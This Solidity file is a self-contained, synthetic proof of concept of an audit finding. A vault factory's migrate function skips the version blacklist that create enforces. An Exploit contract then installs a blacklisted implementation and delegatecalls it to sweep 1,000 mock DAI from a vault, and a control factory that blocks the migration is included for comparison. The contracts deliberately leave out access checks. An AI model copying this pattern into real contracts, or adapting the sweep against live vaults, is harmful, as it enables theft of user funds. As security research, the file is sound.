// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Suzaku VaultFactory.migrate skips the blacklist (Cyfrin, 2025-07-07).
    SYNTHETIC, cheatcode-free. Version 2 is blacklisted. create() rejects it.
    migrate() does not, so the blacklisted implementation sweeps 1,000 DAI.
    The control migrate reverts and the 1,000 stays in the vault. */

contract Dai {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BadImpl {
    function sweep(address token, address to, uint256 amount) external {
        Dai(token).transfer(to, amount);
    }
}

contract Vault {
    address public impl;
    Dai public dai;
    constructor(Dai _dai) {
        dai = _dai;
    }
    function setImpl(address next) external {
        impl = next;
    }
    function sweep(address to, uint256 amount) external {
        address target = impl;
        bytes memory data = abi.encodeWithSelector(BadImpl.sweep.selector, address(dai), to, amount);
        (bool ok, ) = target.delegatecall(data);
        require(ok, "sweep");
    }
}

contract Factory {
    Dai public dai;
    bool public checkMigrate;
    mapping(uint64 => bool) public blacklisted;
    BadImpl public bad;

    constructor(Dai _dai, bool _checkMigrate) {
        dai = _dai;
        checkMigrate = _checkMigrate;
        bad = new BadImpl();
        blacklisted[2] = true;
    }

    function create(uint64 version) external view returns (bool) {
        require(!blacklisted[version], "blacklisted");
        return true;
    }

    function migrate(Vault vault, uint64 version) external {
        if (checkMigrate) {
            require(!blacklisted[version], "blacklisted");
        }
        // @> VULN: migrate does not read blacklisted[version], so version 2 is installed.
        vault.setImpl(address(bad));
    }
}

contract Exploit {
    uint256 public constant MOVED = 1_000e18;

    Dai public dai; // nonce 1
    Vault public vault; // nonce 2
    Factory public factory; // nonce 3
    Vault public fairVault; // nonce 4
    Factory public fairFactory; // nonce 5

    uint256 public swept;
    bool public createBlocked;
    bool public controlBlocked;
    uint256 public controlLeft;

    constructor() {
        dai = new Dai();
        vault = new Vault(dai);
        factory = new Factory(dai, false);
        fairVault = new Vault(dai);
        fairFactory = new Factory(dai, true);
    }

    function run() external {
        dai.mint(address(vault), MOVED);
        dai.mint(address(fairVault), MOVED);

        try factory.create(2) {
            createBlocked = false;
        } catch {
            createBlocked = true;
        }

        factory.migrate(vault, 2);
        vault.sweep(msg.sender, MOVED);
        swept = dai.balanceOf(msg.sender);

        try fairFactory.migrate(fairVault, 2) {
            controlBlocked = false;
        } catch {
            controlBlocked = true;
        }
        controlLeft = dai.balanceOf(address(fairVault));

        require(factory.blacklisted(2), "not blacklisted");
        require(createBlocked, "create allowed v2");
        require(vault.impl() == address(factory.bad()), "impl not installed");
        require(swept == MOVED, "1000 not moved");
        require(dai.balanceOf(address(vault)) == 0, "vault not drained");
        require(controlBlocked, "control migrate succeeded");
        require(controlLeft == MOVED, "control did not keep 1000");
    }
}
